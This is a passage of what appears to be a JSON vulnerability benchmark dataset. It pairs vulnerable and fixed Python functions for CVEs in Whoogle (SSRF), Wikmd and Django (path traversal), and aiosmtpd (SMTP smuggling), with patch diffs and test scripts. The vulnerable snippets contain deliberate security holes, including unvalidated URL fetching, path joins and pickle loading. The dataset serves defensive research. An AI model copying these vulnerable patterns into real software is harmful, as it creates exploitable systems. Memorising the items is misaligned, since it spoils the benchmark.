    "cve_description": "Whoogle Search is a self-hosted metasearch engine. In versions 0.8.3 and prior, the `window` endpoint does not sanitize user-supplied input from the `location` variable and passes it to the `send` method which sends a `GET` request on lines 339-343 in `request.py,` which leads to a server-side request forgery. This issue allows for crafting GET requests to internal and external resources on behalf of the server. For example, this issue would allow for accessing resources on the internal network that the server has access to, even though these resources may not be accessible on the internet. This issue is fixed in version 0.8.4.\n\n",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/benbusby/whoogle-search",
    "patch_url": [
      "https://github.com/benbusby/whoogle-search/commit/3a2e0b262e4a076a20416b45e6b6f23fd265aeda"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_189_1",
        "commit": "8830615",
        "file_path": "app/routes.py",
        "start_line": 419,
        "end_line": 452,
        "snippet": "def config():\n    config_disabled = (\n            app.config['CONFIG_DISABLE'] or\n            not valid_user_session(session))\n    if request.method == 'GET':\n        return json.dumps(g.user_config.__dict__)\n    elif request.method == 'PUT' and not config_disabled:\n        if 'name' in request.args:\n            config_pkl = os.path.join(\n                app.config['CONFIG_PATH'],\n                request.args.get('name'))\n            session['config'] = (pickle.load(open(config_pkl, 'rb'))\n                                 if os.path.exists(config_pkl)\n                                 else session['config'])\n            return json.dumps(session['config'])\n        else:\n            return json.dumps({})\n    elif not config_disabled:\n        config_data = request.form.to_dict()\n        if 'url' not in config_data or not config_data['url']:\n            config_data['url'] = g.user_config.url\n\n        # Save config by name to allow a user to easily load later\n        if 'name' in request.args:\n            pickle.dump(\n                config_data,\n                open(os.path.join(\n                    app.config['CONFIG_PATH'],\n                    request.args.get('name')), 'wb'))\n\n        session['config'] = config_data\n        return redirect(config_data['url'])\n    else:\n        return redirect(url_for('.index'), code=403)"
      },
      {
        "id": "vul_py_189_2",
        "commit": "8830615",
        "file_path": "app/routes.py",
        "start_line": 465,
        "end_line": 490,
        "snippet": "def element():\n    element_url = src_url = request.args.get('url')\n    if element_url.startswith('gAAAAA'):\n        try:\n            cipher_suite = Fernet(g.session_key)\n            src_url = cipher_suite.decrypt(element_url.encode()).decode()\n        except (InvalidSignature, InvalidToken) as e:\n            return render_template(\n                'error.html',\n                error_message=str(e)), 401\n\n    src_type = request.args.get('type')\n\n    try:\n        file_data = g.user_request.send(base_url=src_url).content\n        tmp_mem = io.BytesIO()\n        tmp_mem.write(file_data)\n        tmp_mem.seek(0)\n\n        return send_file(tmp_mem, mimetype=src_type)\n    except exceptions.RequestException:\n        pass\n\n    empty_gif = base64.b64decode(\n        'R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==')\n    return send_file(io.BytesIO(empty_gif), mimetype='image/gif')"
      },
      {
        "id": "vul_py_189_3",
        "commit": "8830615",
        "file_path": "app/routes.py",
        "start_line": 496,
        "end_line": 557,
        "snippet": "def window():\n    target_url = request.args.get('location')\n    if target_url.startswith('gAAAAA'):\n        cipher_suite = Fernet(g.session_key)\n        target_url = cipher_suite.decrypt(target_url.encode()).decode()\n\n    content_filter = Filter(\n        g.session_key,\n        root_url=request.url_root,\n        config=g.user_config)\n    target = urlparse.urlparse(target_url)\n    host_url = f'{target.scheme}://{target.netloc}'\n\n    get_body = g.user_request.send(base_url=target_url).text\n\n    results = bsoup(get_body, 'html.parser')\n    src_attrs = ['src', 'href', 'srcset', 'data-srcset', 'data-src']\n\n    # Parse HTML response and replace relative links w/ absolute\n    for element in results.find_all():\n        for attr in src_attrs:\n            if not element.has_attr(attr) or not element[attr].startswith('/'):\n                continue\n\n            element[attr] = host_url + element[attr]\n\n    # Replace or remove javascript sources\n    for script in results.find_all('script', {'src': True}):\n        if 'nojs' in request.args:\n            script.decompose()\n        else:\n            content_filter.update_element_src(script, 'application/javascript')\n\n    # Replace all possible image attributes\n    img_sources = ['src', 'data-src', 'data-srcset', 'srcset']\n    for img in results.find_all('img'):\n        _ = [\n            content_filter.update_element_src(img, 'image/png', attr=_)\n            for _ in img_sources if img.has_attr(_)\n        ]\n\n    # Replace all stylesheet sources\n    for link in results.find_all('link', {'href': True}):\n        content_filter.update_element_src(link, 'text/css', attr='href')\n\n    # Use anonymous view for all links on page\n    for a in results.find_all('a', {'href': True}):\n        a['href'] = f'{Endpoint.window}?location=' + a['href'] + (\n            '&nojs=1' if 'nojs' in request.args else '')\n\n    # Remove all iframes -- these are commonly used inside of <noscript> tags\n    # to enforce loading Google Analytics\n    for iframe in results.find_all('iframe'):\n        iframe.decompose()\n\n    return render_template(\n        'display.html',\n        response=results,\n        translation=app.config['TRANSLATIONS'][\n            g.user_config.get_localization_lang()\n        ]\n    )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_189_1",
        "commit": "3a2e0b2",
        "file_path": "app/routes.py",
        "start_line": 421,
        "end_line": 459,
        "snippet": "def config():\n    config_disabled = (\n            app.config['CONFIG_DISABLE'] or\n            not valid_user_session(session))\n\n    name = ''\n    if 'name' in request.args:\n        name = os.path.normpath(request.args.get('name'))\n        if not re.match(r'^[A-Za-z0-9_.+-]+$', name):\n            return make_response('Invalid config name', 400)\n\n    if request.method == 'GET':\n        return json.dumps(g.user_config.__dict__)\n    elif request.method == 'PUT' and not config_disabled:\n        if name:\n            config_pkl = os.path.join(app.config['CONFIG_PATH'], name)\n            session['config'] = (pickle.load(open(config_pkl, 'rb'))\n                                 if os.path.exists(config_pkl)\n                                 else session['config'])\n            return json.dumps(session['config'])\n        else:\n            return json.dumps({})\n    elif not config_disabled:\n        config_data = request.form.to_dict()\n        if 'url' not in config_data or not config_data['url']:\n            config_data['url'] = g.user_config.url\n\n        # Save config by name to allow a user to easily load later\n        if 'name' in request.args:\n            pickle.dump(\n                config_data,\n                open(os.path.join(\n                    app.config['CONFIG_PATH'],\n                    name), 'wb'))\n\n        session['config'] = config_data\n        return redirect(config_data['url'])\n    else:\n        return redirect(url_for('.index'), code=403)"
      },
      {
        "id": "fix_py_189_2",
        "commit": "3a2e0b2",
        "file_path": "app/routes.py",
        "start_line": 472,
        "end_line": 502,
        "snippet": "def element():\n    empty_gif = base64.b64decode(\n        'R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==')\n    element_url = src_url = request.args.get('url')\n    if element_url.startswith('gAAAAA'):\n        try:\n            cipher_suite = Fernet(g.session_key)\n            src_url = cipher_suite.decrypt(element_url.encode()).decode()\n        except (InvalidSignature, InvalidToken) as e:\n            return render_template(\n                'error.html',\n                error_message=str(e)), 401\n\n    src_type = request.args.get('type')\n\n    # Ensure requested element is from a valid domain\n    domain = urlparse.urlparse(src_url).netloc\n    if not validators.domain(domain):\n        return send_file(io.BytesIO(empty_gif), mimetype='image/gif')\n\n    try:\n        file_data = g.user_request.send(base_url=src_url).content\n        tmp_mem = io.BytesIO()\n        tmp_mem.write(file_data)\n        tmp_mem.seek(0)\n\n        return send_file(tmp_mem, mimetype=src_type)\n    except exceptions.RequestException:\n        pass\n\n    return send_file(io.BytesIO(empty_gif), mimetype='image/gif')"
      },
      {
        "id": "fix_py_189_3",
        "commit": "3a2e0b2",
        "file_path": "app/routes.py",
        "start_line": 508,
        "end_line": 576,
        "snippet": "def window():\n    target_url = request.args.get('location')\n    if target_url.startswith('gAAAAA'):\n        cipher_suite = Fernet(g.session_key)\n        target_url = cipher_suite.decrypt(target_url.encode()).decode()\n\n    content_filter = Filter(\n        g.session_key,\n        root_url=request.url_root,\n        config=g.user_config)\n    target = urlparse.urlparse(target_url)\n\n    # Ensure requested URL has a valid domain\n    if not validators.domain(target.netloc):\n        return render_template(\n            'error.html',\n            error_message='Invalid location'), 400\n\n    host_url = f'{target.scheme}://{target.netloc}'\n\n    get_body = g.user_request.send(base_url=target_url).text\n\n    results = bsoup(get_body, 'html.parser')\n    src_attrs = ['src', 'href', 'srcset', 'data-srcset', 'data-src']\n\n    # Parse HTML response and replace relative links w/ absolute\n    for element in results.find_all():\n        for attr in src_attrs:\n            if not element.has_attr(attr) or not element[attr].startswith('/'):\n                continue\n\n            element[attr] = host_url + element[attr]\n\n    # Replace or remove javascript sources\n    for script in results.find_all('script', {'src': True}):\n        if 'nojs' in request.args:\n            script.decompose()\n        else:\n            content_filter.update_element_src(script, 'application/javascript')\n\n    # Replace all possible image attributes\n    img_sources = ['src', 'data-src', 'data-srcset', 'srcset']\n    for img in results.find_all('img'):\n        _ = [\n            content_filter.update_element_src(img, 'image/png', attr=_)\n            for _ in img_sources if img.has_attr(_)\n        ]\n\n    # Replace all stylesheet sources\n    for link in results.find_all('link', {'href': True}):\n        content_filter.update_element_src(link, 'text/css', attr='href')\n\n    # Use anonymous view for all links on page\n    for a in results.find_all('a', {'href': True}):\n        a['href'] = f'{Endpoint.window}?location=' + a['href'] + (\n            '&nojs=1' if 'nojs' in request.args else '')\n\n    # Remove all iframes -- these are commonly used inside of <noscript> tags\n    # to enforce loading Google Analytics\n    for iframe in results.find_all('iframe'):\n        iframe.decompose()\n\n    return render_template(\n        'display.html',\n        response=results,\n        translation=app.config['TRANSLATIONS'][\n            g.user_config.get_localization_lang()\n        ]\n    )"
      }
    ],
    "vul_patch": "--- a/app/routes.py\n+++ b/app/routes.py\n@@ -2,13 +2,18 @@\n     config_disabled = (\n             app.config['CONFIG_DISABLE'] or\n             not valid_user_session(session))\n+\n+    name = ''\n+    if 'name' in request.args:\n+        name = os.path.normpath(request.args.get('name'))\n+        if not re.match(r'^[A-Za-z0-9_.+-]+$', name):\n+            return make_response('Invalid config name', 400)\n+\n     if request.method == 'GET':\n         return json.dumps(g.user_config.__dict__)\n     elif request.method == 'PUT' and not config_disabled:\n-        if 'name' in request.args:\n-            config_pkl = os.path.join(\n-                app.config['CONFIG_PATH'],\n-                request.args.get('name'))\n+        if name:\n+            config_pkl = os.path.join(app.config['CONFIG_PATH'], name)\n             session['config'] = (pickle.load(open(config_pkl, 'rb'))\n                                  if os.path.exists(config_pkl)\n                                  else session['config'])\n@@ -26,7 +31,7 @@\n                 config_data,\n                 open(os.path.join(\n                     app.config['CONFIG_PATH'],\n-                    request.args.get('name')), 'wb'))\n+                    name), 'wb'))\n \n         session['config'] = config_data\n         return redirect(config_data['url'])\n\n--- a/app/routes.py\n+++ b/app/routes.py\n@@ -1,4 +1,6 @@\n def element():\n+    empty_gif = base64.b64decode(\n+        'R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==')\n     element_url = src_url = request.args.get('url')\n     if element_url.startswith('gAAAAA'):\n         try:\n@@ -11,6 +13,11 @@\n \n     src_type = request.args.get('type')\n \n+    # Ensure requested element is from a valid domain\n+    domain = urlparse.urlparse(src_url).netloc\n+    if not validators.domain(domain):\n+        return send_file(io.BytesIO(empty_gif), mimetype='image/gif')\n+\n     try:\n         file_data = g.user_request.send(base_url=src_url).content\n         tmp_mem = io.BytesIO()\n@@ -21,6 +28,4 @@\n     except exceptions.RequestException:\n         pass\n \n-    empty_gif = base64.b64decode(\n-        'R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==')\n     return send_file(io.BytesIO(empty_gif), mimetype='image/gif')\n\n--- a/app/routes.py\n+++ b/app/routes.py\n@@ -9,6 +9,13 @@\n         root_url=request.url_root,\n         config=g.user_config)\n     target = urlparse.urlparse(target_url)\n+\n+    # Ensure requested URL has a valid domain\n+    if not validators.domain(target.netloc):\n+        return render_template(\n+            'error.html',\n+            error_message='Invalid location'), 400\n+\n     host_url = f'{target.scheme}://{target.netloc}'\n \n     get_body = g.user_request.send(base_url=target_url).text\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-36081",
    "cve_description": "Wikmd is a file based wiki that uses markdown. Prior to version 1.7.1, Wikmd is vulnerable to path traversal when accessing `/list/<path:folderpath>` and discloses lists of files located on the server including sensitive data. Version 1.7.1 fixes this issue.",
    "cwe_info": {
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/Linbreux/wikmd",
    "patch_url": [
      "https://github.com/Linbreux/wikmd/commit/8d1f94ec86b5b6c3df8ef10051facfb511a78450"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_353_1",
        "commit": "259412c47d64d5b85980f95345179fbf05927798",
        "file_path": "wiki.py",
        "start_line": 128,
        "end_line": 169,
        "snippet": "def list_wiki(folderpath):\n    folder_list = []\n    app.logger.info(\"Showing >>> 'all files'\")\n    for root, subfolder, files in os.walk(os.path.join(cfg.wiki_directory, folderpath)):\n        if root[-1] == '/':\n            root = root[:-1]\n        for item in files:\n            path = os.path.join(root, item)\n            mtime = os.path.getmtime(os.path.join(root, item))\n            if os.path.join(cfg.wiki_directory, '.git') in str(path):\n                # We don't want to search there\n                app.logger.debug(f\"skipping {path}: is git file\")\n                continue\n            if os.path.join(cfg.wiki_directory, cfg.images_route) in str(path):\n                # Nothing interesting there too\n                continue\n\n            folder = root[len(cfg.wiki_directory + \"/\"):]\n            if folder == \"\":\n                if item == cfg.homepage:\n                    continue\n                url = os.path.splitext(\n                    root[len(cfg.wiki_directory + \"/\"):] + \"/\" + item)[0]\n            else:\n                url = \"/\" + \\\n                    os.path.splitext(\n                        root[len(cfg.wiki_directory + \"/\"):] + \"/\" + item)[0]\n\n            info = {'doc': item,\n                    'url': url,\n                    'folder': folder,\n                    'folder_url': folder,\n                    'mtime': mtime,\n                    }\n            folder_list.append(info)\n\n    if SYSTEM_SETTINGS['listsortMTime']:\n        folder_list.sort(key=lambda x: x[\"mtime\"], reverse=True)\n    else:\n        folder_list.sort(key=lambda x: (str(x[\"url\"]).casefold()))\n\n    return render_template('list_files.html', list=folder_list, folder=folderpath, system=SYSTEM_SETTINGS)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_353_1",
        "commit": "8d1f94ec86b5b6c3df8ef10051facfb511a78450",
        "file_path": "wiki.py",
        "start_line": 128,
        "end_line": 174,
        "snippet": "def list_wiki(folderpath):\n    folder_list = []\n    app.logger.info(\"Showing >>> 'all files'\")\n    safe_folder = cfg.wiki_directory\n    requested_path = os.path.join(cfg.wiki_directory,folderpath) \n    print(requested_path)\n    if os.path.commonprefix((os.path.realpath(requested_path),os.path.realpath(safe_folder))) != os.path.realpath(safe_folder): \n        return index()\n    for root, subfolder, files in os.walk(requested_path):\n        if root[-1] == '/':\n            root = root[:-1]\n        for item in files:\n            path = os.path.join(root, item)\n            mtime = os.path.getmtime(os.path.join(root, item))\n            if os.path.join(cfg.wiki_directory, '.git') in str(path):\n                # We don't want to search there\n                app.logger.debug(f\"skipping {path}: is git file\")\n                continue\n            if os.path.join(cfg.wiki_directory, cfg.images_route) in str(path):\n                # Nothing interesting there too\n                continue\n\n            folder = root[len(cfg.wiki_directory + \"/\"):]\n            if folder == \"\":\n                if item == cfg.homepage:\n                    continue\n                url = os.path.splitext(\n                    root[len(cfg.wiki_directory + \"/\"):] + \"/\" + item)[0]\n            else:\n                url = \"/\" + \\\n                    os.path.splitext(\n                        root[len(cfg.wiki_directory + \"/\"):] + \"/\" + item)[0]\n\n            info = {'doc': item,\n                    'url': url,\n                    'folder': folder,\n                    'folder_url': folder,\n                    'mtime': mtime,\n                    }\n            folder_list.append(info)\n\n    if SYSTEM_SETTINGS['listsortMTime']:\n        folder_list.sort(key=lambda x: x[\"mtime\"], reverse=True)\n    else:\n        folder_list.sort(key=lambda x: (str(x[\"url\"]).casefold()))\n\n    return render_template('list_files.html', list=folder_list, folder=folderpath, system=SYSTEM_SETTINGS)"
      }
    ],
    "vul_patch": "--- a/wiki.py\n+++ b/wiki.py\n@@ -1,7 +1,12 @@\n def list_wiki(folderpath):\n     folder_list = []\n     app.logger.info(\"Showing >>> 'all files'\")\n-    for root, subfolder, files in os.walk(os.path.join(cfg.wiki_directory, folderpath)):\n+    safe_folder = cfg.wiki_directory\n+    requested_path = os.path.join(cfg.wiki_directory,folderpath) \n+    print(requested_path)\n+    if os.path.commonprefix((os.path.realpath(requested_path),os.path.realpath(safe_folder))) != os.path.realpath(safe_folder): \n+        return index()\n+    for root, subfolder, files in os.walk(requested_path):\n         if root[-1] == '/':\n             root = root[:-1]\n         for item in files:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-31542",
    "cve_description": "In Django 2.2 before 2.2.21, 3.1 before 3.1.9, and 3.2 before 3.2.1, MultiPartParser, UploadedFile, and FieldFile allowed directory traversal via uploaded files with suitably crafted file names.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/django/django",
    "patch_url": [
      "https://github.com/django/django/commit/04ac1624bdc2fa737188401757cf95ced122d26d",
      "https://github.com/django/django/commit/25d84d64122c15050a0ee739e859f22ddab5ac48",
      "https://github.com/django/django/commit/c98f446c188596d4ba6de71d1b77b4a6c5c2a007"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_3_1",
        "commit": "7f1b088",
        "file_path": "django/core/files/storage.py",
        "start_line": 63,
        "end_line": 92,
        "snippet": "    def get_available_name(self, name, max_length=None):\n        \"\"\"\n        Return a filename that's free on the target storage system and\n        available for new content to be written to.\n        \"\"\"\n        dir_name, file_name = os.path.split(name)\n        file_root, file_ext = os.path.splitext(file_name)\n        # If the filename already exists, add an underscore and a random 7\n        # character alphanumeric string (before the file extension, if one\n        # exists) to the filename until the generated filename doesn't exist.\n        # Truncate original name if required, so the new filename does not\n        # exceed the max_length.\n        while self.exists(name) or (max_length and len(name) > max_length):\n            # file_ext includes the dot.\n            name = os.path.join(dir_name, \"%s_%s%s\" % (file_root, get_random_string(7), file_ext))\n            if max_length is None:\n                continue\n            # Truncate file_root if max_length exceeded.\n            truncation = len(name) - max_length\n            if truncation > 0:\n                file_root = file_root[:-truncation]\n                # Entire file_root was truncated in attempt to find an available filename.\n                if not file_root:\n                    raise SuspiciousFileOperation(\n                        'Storage can not find an available filename for \"%s\". '\n                        'Please make sure that the corresponding file field '\n                        'allows sufficient \"max_length\".' % name\n                    )\n                name = os.path.join(dir_name, \"%s_%s%s\" % (file_root, get_random_string(7), file_ext))\n        return name"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_3_1",
        "commit": "04ac162",
        "file_path": "django/core/files/storage.py",
        "start_line": 65,
        "end_line": 97,
        "snippet": "    def get_available_name(self, name, max_length=None):\n        \"\"\"\n        Return a filename that's free on the target storage system and\n        available for new content to be written to.\n        \"\"\"\n        dir_name, file_name = os.path.split(name)\n        if '..' in pathlib.PurePath(dir_name).parts:\n            raise SuspiciousFileOperation(\"Detected path traversal attempt in '%s'\" % dir_name)\n        validate_file_name(file_name)\n        file_root, file_ext = os.path.splitext(file_name)\n        # If the filename already exists, add an underscore and a random 7\n        # character alphanumeric string (before the file extension, if one\n        # exists) to the filename until the generated filename doesn't exist.\n        # Truncate original name if required, so the new filename does not\n        # exceed the max_length.\n        while self.exists(name) or (max_length and len(name) > max_length):\n            # file_ext includes the dot.\n            name = os.path.join(dir_name, \"%s_%s%s\" % (file_root, get_random_string(7), file_ext))\n            if max_length is None:\n                continue\n            # Truncate file_root if max_length exceeded.\n            truncation = len(name) - max_length\n            if truncation > 0:\n                file_root = file_root[:-truncation]\n                # Entire file_root was truncated in attempt to find an available filename.\n                if not file_root:\n                    raise SuspiciousFileOperation(\n                        'Storage can not find an available filename for \"%s\". '\n                        'Please make sure that the corresponding file field '\n                        'allows sufficient \"max_length\".' % name\n                    )\n                name = os.path.join(dir_name, \"%s_%s%s\" % (file_root, get_random_string(7), file_ext))\n        return name"
      },
      {
        "id": "fix_py_3_2",
        "commit": "04ac162",
        "file_path": "django/core/files/utils.py",
        "start_line": 6,
        "end_line": 14,
        "snippet": "def validate_file_name(name):\n    if name != os.path.basename(name):\n        raise SuspiciousFileOperation(\"File name '%s' includes path elements\" % name)\n\n    # Remove potentially dangerous names\n    if name in {'', '.', '..'}:\n        raise SuspiciousFileOperation(\"Could not derive file name from '%s'\" % name)\n\n    return name"
      }
    ],
    "vul_patch": "--- a/django/core/files/storage.py\n+++ b/django/core/files/storage.py\n@@ -4,6 +4,9 @@\n         available for new content to be written to.\n         \"\"\"\n         dir_name, file_name = os.path.split(name)\n+        if '..' in pathlib.PurePath(dir_name).parts:\n+            raise SuspiciousFileOperation(\"Detected path traversal attempt in '%s'\" % dir_name)\n+        validate_file_name(file_name)\n         file_root, file_ext = os.path.splitext(file_name)\n         # If the filename already exists, add an underscore and a random 7\n         # character alphanumeric string (before the file extension, if one\n\n--- /dev/null\n+++ b/django/core/files/storage.py\n@@ -0,0 +1,9 @@\n+def validate_file_name(name):\n+    if name != os.path.basename(name):\n+        raise SuspiciousFileOperation(\"File name '%s' includes path elements\" % name)\n+\n+    # Remove potentially dangerous names\n+    if name in {'', '.', '..'}:\n+        raise SuspiciousFileOperation(\"Could not derive file name from '%s'\" % name)\n+\n+    return name\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-31542:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2021-31542/bin/python ./runtests.py file_storage.test_generate_filename.GenerateFilenameStorageTests.test_storage_dangerous_paths file_storage.test_generate_filename.GenerateFilenameStorageTests.test_storage_dangerous_paths_dir_name\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-31542:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2021-31542/bin/python ./runtests.py file_storage.test_generate_filename file_uploads.tests  forms_tests.field_tests.test_filefield utils_tests.test_text\n"
  },
  {
    "cve_id": "CVE-2024-27305",
    "cve_description": "aiosmtpd is a reimplementation of the Python stdlib smtpd.py based on asyncio. aiosmtpd is vulnerable to inbound SMTP smuggling. SMTP smuggling is a novel vulnerability based on not so novel interpretation differences of the SMTP protocol. By exploiting SMTP smuggling, an attacker may send smuggle/spoof e-mails with fake sender addresses, allowing advanced phishing attacks. This issue is also existed in other SMTP software like Postfix. With the right SMTP server constellation, an attacker can send spoofed e-mails to inbound/receiving aiosmtpd instances. This issue has been addressed in version 1.4.5. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "cwe_info": {
      "CWE-345": {
        "name": "Insufficient Verification of Data Authenticity",
        "description": "The product does not sufficiently verify the origin or authenticity of data, in a way that causes it to accept invalid data."
      }
    },
    "repo": "https://github.com/aio-libs/aiosmtpd",
    "patch_url": [
      "https://github.com/aio-libs/aiosmtpd/commit/24b6c79c8921cf1800e27ca144f4f37023982bbb"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_419_1",
        "commit": "b0267e8",
        "file_path": "aiosmtpd/smtp.py",
        "start_line": 1406,
        "end_line": 1541,
        "snippet": "    async def smtp_DATA(self, arg: str) -> None:\n        if await self.check_helo_needed():\n            return\n        if await self.check_auth_needed(\"DATA\"):\n            return\n        assert self.envelope is not None\n        if not self.envelope.rcpt_tos:\n            await self.push('503 Error: need RCPT command')\n            return\n        if arg:\n            await self.push('501 Syntax: DATA')\n            return\n\n        await self.push('354 End data with <CR><LF>.<CR><LF>')\n        data: List[bytearray] = []\n\n        num_bytes: int = 0\n        limit: Optional[int] = self.data_size_limit\n        line_fragments: List[bytes] = []\n        state: _DataState = _DataState.NOMINAL\n        while self.transport is not None:           # pragma: nobranch\n            # Since eof_received cancels this coroutine,\n            # readuntil() can never raise asyncio.IncompleteReadError.\n            try:\n                line: bytes = await self._reader.readuntil()\n                log.debug('DATA readline: %s', line)\n                assert line.endswith(b'\\n')\n            except asyncio.CancelledError:\n                # The connection got reset during the DATA command.\n                log.info('Connection lost during DATA')\n                self._writer.close()\n                raise\n            except asyncio.LimitOverrunError as e:\n                # The line exceeds StreamReader's \"stream limit\".\n                # Delay SMTP Status Code sending until data receive is complete\n                # This seems to be implied in RFC 5321 \\u00a7 4.2.5\n                if state == _DataState.NOMINAL:\n                    # Transition to TOO_LONG only if we haven't gone TOO_MUCH yet\n                    state = _DataState.TOO_LONG\n                # Discard data immediately to prevent memory pressure\n                data *= 0\n                # Drain the stream anyways\n                line = await self._reader.read(e.consumed)\n                assert not line.endswith(b'\\n')\n            # A lone dot in a line signals the end of DATA.\n            if not line_fragments and line == b'.\\r\\n':\n                break\n            num_bytes += len(line)\n            if state == _DataState.NOMINAL and limit and num_bytes > limit:\n                # Delay SMTP Status Code sending until data receive is complete\n                # This seems to be implied in RFC 5321 \\u00a7 4.2.5\n                state = _DataState.TOO_MUCH\n                # Discard data immediately to prevent memory pressure\n                data *= 0\n            line_fragments.append(line)\n            if line.endswith(b'\\n'):\n                # Record data only if state is \"NOMINAL\"\n                if state == _DataState.NOMINAL:\n                    line = EMPTY_BARR.join(line_fragments)\n                    if len(line) > self.line_length_limit:\n                        # Theoretically we shouldn't reach this place. But it's always\n                        # good to practice DEFENSIVE coding.\n                        state = _DataState.TOO_LONG\n                        # Discard data immediately to prevent memory pressure\n                        data *= 0\n                    else:\n                        data.append(EMPTY_BARR.join(line_fragments))\n                line_fragments *= 0\n\n        # Day of reckoning! Let's take care of those out-of-nominal situations\n        if state != _DataState.NOMINAL:\n            if state == _DataState.TOO_LONG:\n                await self.push(\"500 Line too long (see RFC5321 4.5.3.1.6)\")\n            elif state == _DataState.TOO_MUCH:  # pragma: nobranch\n                await self.push('552 Error: Too much mail data')\n            self._set_post_data_state()\n            return\n\n        # If unfinished_line is non-empty, then the connection was closed.\n        assert not line_fragments\n\n        # Remove extraneous carriage returns and de-transparency\n        # according to RFC 5321, Section 4.5.2.\n        for text in data:\n            if text.startswith(b'.'):\n                del text[0]\n        original_content: bytes = EMPTYBYTES.join(data)\n        # Discard data immediately to prevent memory pressure\n        data *= 0\n\n        content: Union[str, bytes]\n        if self._decode_data:\n            if self.enable_SMTPUTF8:\n                content = original_content.decode('utf-8', errors='surrogateescape')\n            else:\n                try:\n                    content = original_content.decode('ascii', errors='strict')\n                except UnicodeDecodeError:\n                    # This happens if enable_smtputf8 is false, meaning that\n                    # the server explicitly does not want to accept non-ascii,\n                    # but the client ignores that and sends non-ascii anyway.\n                    await self.push('500 Error: strict ASCII mode')\n                    return\n        else:\n            content = original_content\n        self.envelope.content = content\n        self.envelope.original_content = original_content\n\n        # Call the new API first if it's implemented.\n        if \"DATA\" in self._handle_hooks:\n            status = await self._call_handler_hook('DATA')\n        else:\n            # Backward compatibility.\n            status = MISSING\n            if hasattr(self.event_handler, 'process_message'):\n                warn('Use handler.handle_DATA() instead of .process_message()',\n                     DeprecationWarning)\n                assert self.session is not None\n                args = (self.session.peer, self.envelope.mail_from,\n                        self.envelope.rcpt_tos, self.envelope.content)\n                if asyncio.iscoroutinefunction(\n                        self.event_handler.process_message):\n                    status = await self.event_handler.process_message(*args)\n                else:\n                    status = self.event_handler.process_message(*args)\n                # The deprecated API can return None which means, return the\n                # default status.  Don't worry about coverage for this case as\n                # it's a deprecated API that will go away after 1.0.\n                if status is None:                  # pragma: nocover\n                    status = MISSING\n        self._set_post_data_state()\n        await self.push('250 OK' if status is MISSING else status)\n\n    # Commands that have not been implemented.\n    async def smtp_EXPN(self, arg: str):\n        await self.push('502 EXPN not implemented')"
      },
      {
        "id": "vul_py_419_2",
        "commit": "b0267e8",
        "file_path": "aiosmtpd/smtp.py",
        "start_line": 90,
        "end_line": 90,
        "snippet": "NEWLINE = '\\n'"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_419_1",
        "commit": "24b6c79c8921cf1800e27ca144f4f37023982bbb",
        "file_path": "aiosmtpd/smtp.py",
        "start_line": 1406,
        "end_line": 1542,
        "snippet": "    async def smtp_DATA(self, arg: str) -> None:\n        if await self.check_helo_needed():\n            return\n        if await self.check_auth_needed(\"DATA\"):\n            return\n        assert self.envelope is not None\n        if not self.envelope.rcpt_tos:\n            await self.push('503 Error: need RCPT command')\n            return\n        if arg:\n            await self.push('501 Syntax: DATA')\n            return\n\n        await self.push('354 End data with <CR><LF>.<CR><LF>')\n        data: List[bytearray] = []\n\n        num_bytes: int = 0\n        limit: Optional[int] = self.data_size_limit\n        line_fragments: List[bytes] = []\n        state: _DataState = _DataState.NOMINAL\n        while self.transport is not None:           # pragma: nobranch\n            # Since eof_received cancels this coroutine,\n            # readuntil() can never raise asyncio.IncompleteReadError.\n            try:\n                # https://datatracker.ietf.org/doc/html/rfc5321#section-2.3.8\n                line: bytes = await self._reader.readuntil(b'\\r\\n')\n                log.debug('DATA readline: %s', line)\n                assert line.endswith(b'\\r\\n')\n            except asyncio.CancelledError:\n                # The connection got reset during the DATA command.\n                log.info('Connection lost during DATA')\n                self._writer.close()\n                raise\n            except asyncio.LimitOverrunError as e:\n                # The line exceeds StreamReader's \"stream limit\".\n                # Delay SMTP Status Code sending until data receive is complete\n                # This seems to be implied in RFC 